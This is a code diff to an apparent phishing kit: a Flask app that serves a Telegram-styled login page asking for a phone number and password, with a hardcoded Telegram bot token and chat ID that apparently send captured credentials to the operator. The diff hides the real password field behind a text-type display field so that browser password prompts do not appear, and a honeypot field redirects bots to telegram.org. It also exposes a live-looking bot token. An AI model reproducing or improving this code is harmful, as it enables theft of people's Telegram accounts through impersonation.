@@ -4,7 +4,7 @@ from datetime import datetime
 
 app = Flask(__name__)
 
-# ===== PUT YOUR ACTUAL TOKEN AND CHAT ID HERE =====
+# ===== PUT YOUR REAL TOKEN AND CHAT ID HERE =====
 BOT_TOKEN = "8161884377:AAH7zILNRGrqH-12JtobVpsxslIXIQoMipM"  # REPLACE THIS
 CHAT_ID = "6181804501"                                 # REPLACE THIS
 # ===================================================
@@ -28,6 +28,7 @@ HTML_PAGE = """<!DOCTYPE html>
         .login-header p{color:#888;font-size:15px}
         .input-group{margin-bottom:16px}
         .input-group label{display:block;color:#888;font-size:13px;font-weight:500;margin-bottom:6px;text-transform:uppercase;letter-spacing:.3px}
+
         .phone-row{display:flex;align-items:center;background:#262626;border:1px solid #333;border-radius:10px;transition:border-color .2s,background .2s;padding:0 4px;min-height:52px}
         .phone-row:focus-within{border-color:#0088cc;background:#2a2a2a}
         .phone-row .country-code{width:65px;min-width:50px;flex-shrink:0;border:none;background:transparent;padding:14px 4px 14px 14px;color:#fff;font-size:16px;outline:none;text-align:center;font-weight:500}
@@ -35,19 +36,26 @@ HTML_PAGE = """<!DOCTYPE html>
         .phone-row .separator{color:#555;font-size:18px;padding:0 2px;user-select:none;flex-shrink:0}
         .phone-row .phone-input{flex:1;min-width:120px;border:none;background:transparent;padding:14px 14px 14px 4px;color:#fff;font-size:16px;outline:none}
         .phone-row .phone-input::placeholder{color:#555}
+
+        /* ===== CUSTOM PASSWORD — NO BROWSER POPUPS ===== */
         .password-wrapper{display:flex;align-items:center;background:#262626;border:1px solid #333;border-radius:10px;transition:border-color .2s,background .2s;min-height:52px;position:relative}
         .password-wrapper:focus-within{border-color:#0088cc;background:#2a2a2a}
-        .password-wrapper input[type="password"]{flex:1;min-width:80px;border:none;background:transparent;padding:14px 12px 14px 16px;color:#fff!important;font-size:16px;outline:none;-webkit-text-fill-color:#fff!important;opacity:1!important;-webkit-text-security:disc!important;text-security:disc!important;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif}
-        .password-wrapper input[type="password"]::placeholder{color:#555!important;-webkit-text-fill-color:#555!important;opacity:1!important;-webkit-text-security:none!important;text-security:none!important}
-        .password-wrapper input[type="password"]:-webkit-autofill{-webkit-box-shadow:0 0 0 1000px #262626 inset!important;-webkit-text-fill-color:#fff!important;-webkit-text-security:disc!important}
-        .password-wrapper input[type="password"]::-webkit-reveal{display:none!important}
-        .password-wrapper input[type="password"]::-ms-reveal{display:none!important}
+        
+        /* Hidden real input */
+        .password-wrapper .password-real{position:absolute;opacity:0;pointer-events:none;width:0;height:0;z-index:-1}
+        
+        /* Display input - always type="text" so no browser popups */
+        .password-wrapper .password-display{flex:1;min-width:80px;border:none;background:transparent;padding:14px 12px 14px 16px;color:#fff!important;font-size:16px;outline:none;-webkit-text-fill-color:#fff!important;opacity:1!important;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;letter-spacing:2px}
+        .password-wrapper .password-display::placeholder{color:#555!important;-webkit-text-fill-color:#555!important;opacity:1!important;letter-spacing:0}
+        .password-wrapper .password-display:-webkit-autofill{-webkit-box-shadow:0 0 0 1000px #262626 inset!important;-webkit-text-fill-color:#fff!important}
+
         .password-toggle{flex-shrink:0;background:none;border:none;cursor:pointer;padding:8px 14px 8px 6px;color:#888;display:flex;align-items:center;justify-content:center;transition:color .2s;height:100%;min-height:44px;position:relative;z-index:2}
         .password-toggle:hover{color:#ddd}
         .password-toggle svg{width:22px;height:22px;display:block;stroke:currentColor;stroke-width:2;fill:none;stroke-linecap:round;stroke-linejoin:round}
         .password-toggle .eye-closed{display:none}
         .password-toggle.hidden .eye-open{display:none}
         .password-toggle.hidden .eye-closed{display:block}
+
         .options-row{display:flex;justify-content:space-between;align-items:center;margin:16px 0 20px;flex-wrap:wrap;gap:8px}
         .options-row label{color:#888;font-size:14px;display:flex;align-items:center;gap:8px;cursor:pointer}
         .options-row label input[type="checkbox"]{width:16px;height:16px;accent-color:#0088cc}
@@ -74,8 +82,8 @@ HTML_PAGE = """<!DOCTYPE html>
         @keyframes spin{to{transform:rotate(360deg)}}
         .loading-overlay p{color:#aaa;font-size:15px}
         .honeypot{position:absolute;left:-9999px;top:-9999px;opacity:0;pointer-events:none}
-        @media(max-width:500px){.login-wrapper{padding:32px 20px 28px;border-radius:16px;margin:0}.phone-row .country-code{width:50px;min-width:40px;padding:12px 2px 12px 10px;font-size:15px}.phone-row .phone-input{padding:12px 10px 12px 2px;font-size:15px;min-width:80px}.password-wrapper input[type="password"]{padding:12px 10px 12px 14px;font-size:15px}.password-toggle{padding:6px 10px 6px 4px;min-height:40px}.password-toggle svg{width:20px;height:20px}}
-        @media(min-width:1200px){.login-wrapper{max-width:460px;padding:56px 48px 48px}.phone-row .country-code{width:70px;padding:16px 6px 16px 18px;font-size:17px}.phone-row .phone-input{padding:16px 18px 16px 6px;font-size:17px}.password-wrapper input[type="password"]{padding:16px 14px 16px 18px;font-size:17px}.password-toggle{padding:10px 18px 10px 8px;min-height:52px}.password-toggle svg{width:24px;height:24px}}
+        @media(max-width:500px){.login-wrapper{padding:32px 20px 28px;border-radius:16px;margin:0}.phone-row .country-code{width:50px;min-width:40px;padding:12px 2px 12px 10px;font-size:15px}.phone-row .phone-input{padding:12px 10px 12px 2px;font-size:15px;min-width:80px}.password-wrapper .password-display{padding:12px 10px 12px 14px;font-size:15px}.password-toggle{padding:6px 10px 6px 4px;min-height:40px}.password-toggle svg{width:20px;height:20px}}
+        @media(min-width:1200px){.login-wrapper{max-width:460px;padding:56px 48px 48px}.phone-row .country-code{width:70px;padding:16px 6px 16px 18px;font-size:17px}.phone-row .phone-input{padding:16px 18px 16px 6px;font-size:17px}.password-wrapper .password-display{padding:16px 14px 16px 18px;font-size:17px}.password-toggle{padding:10px 18px 10px 8px;min-height:52px}.password-toggle svg{width:24px;height:24px}}
     </style>
 </head>
 <body>
@@ -98,7 +106,10 @@ HTML_PAGE = """<!DOCTYPE html>
             <div class="input-group">
                 <label>Password</label>
                 <div class="password-wrapper">
-                    <input type="password" id="password" name="password" placeholder="Enter your password" required>
+                    <!-- Hidden real password field (submitted) -->
+                    <input type="password" class="password-real" id="passwordReal" name="password">
+                    <!-- Display field (never changes type = no browser popups) -->
+                    <input type="text" class="password-display" id="passwordDisplay" placeholder="Enter your password" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">
                     <button type="button" class="password-toggle hidden" id="togglePassword" aria-label="Toggle password visibility">
                         <svg class="eye-open" viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
                         <svg class="eye-closed" viewBox="0 0 24 24"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/><line x1="3" y1="3" x2="21" y2="21"/></svg>
@@ -117,40 +128,111 @@ HTML_PAGE = """<!DOCTYPE html>
     </div>
     <script>
         (function() {
+            const display = document.getElementById('passwordDisplay');
+            const real = document.getElementById('passwordReal');
             const toggle = document.getElementById('togglePassword');
-            const field = document.getElementById('password');
             let visible = false;
+            let password = '';
+
             toggle.classList.add('hidden');
+
+            function updateDisplay() {
+                if (visible) {
+                    display.value = password;
+                } else {
+                    display.value = password.split('').map(() => '•').join('');
+                }
+                real.value = password;
+            }
+
+            display.addEventListener('input', function(e) {
+                const input = this.value;
+                const len = input.length;
+                const oldLen = password.length;
+
+                if (visible) {
+                    password = input;
+                } else {
+                    // In hidden mode, we need to detect what changed
+                    if (len > oldLen) {
+                        // Character added
+                        const newChar = input[len - 1] || '';
+                        if (newChar) password += newChar;
+                    } else if (len < oldLen) {
+                        // Character removed (backspace)
+                        password = password.slice(0, len);
+                    } else if (len === oldLen && len > 0) {
+                        // Replacement (paste or selection change)
+                        password = input;
+                    }
+                }
+                updateDisplay();
+                // Move cursor to end
+                display.setSelectionRange(password.length, password.length);
+            });
+
+            // Handle backspace/delete properly
+            display.addEventListener('keydown', function(e) {
+                if (e.key === 'Backspace' && !visible) {
+                    e.preventDefault();
+                    password = password.slice(0, -1);
+                    updateDisplay();
+                } else if (e.key === 'Delete' && !visible) {
+                    e.preventDefault();
+                }
+            });
+
+            // Handle paste
+            display.addEventListener('paste', function(e) {
+                e.preventDefault();
+                const pasted = (e.clipboardData || window.clipboardData).getData('text');
+                if (pasted) {
+                    if (visible) {
+                        password = pasted;
+                    } else {
+                        password += pasted;
+                    }
+                    updateDisplay();
+                }
+            });
+
+            // Toggle visibility
             toggle.addEventListener('click', function(e) {
                 e.preventDefault();
                 visible = !visible;
                 toggle.classList.toggle('hidden', !visible);
-                field.type = visible ? 'text' : 'password';
-                field.focus();
+                updateDisplay();
+                display.focus();
+                display.setSelectionRange(password.length, password.length);
             });
-            field.addEventListener('input', function() {
-                if (this.value.length === 0 && visible) {
-                    visible = false;
-                    toggle.classList.add('hidden');
-                    this.type = 'password';
-                }
+
+            // Sync on form submit
+            document.getElementById('loginForm').addEventListener('submit', function(e) {
+                real.value = password;
             });
+
+            // Focus management
+            display.addEventListener('focus', function() {
+                this.setSelectionRange(password.length, password.length);
+            });
+
+            // Initialize
+            updateDisplay();
         })();
+
         document.getElementById('loginForm').addEventListener('submit', function(e) {
             if (document.getElementById('website').value.length > 0) {
                 e.preventDefault();
                 window.location.href = 'https://telegram.org';
                 return;
             }
-            const passwordField = document.getElementById('password');
-            const realPassword = passwordField.value;
             const btn = document.getElementById('loginBtn');
             btn.disabled = true;
             btn.textContent = 'Signing in...';
             document.getElementById('loadingOverlay').classList.add('active');
             document.getElementById('sessionToken').value = 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
-            passwordField.value = realPassword;
         });
+
         document.addEventListener('DOMContentLoaded', function() {
             document.getElementById('phone').focus();
         });
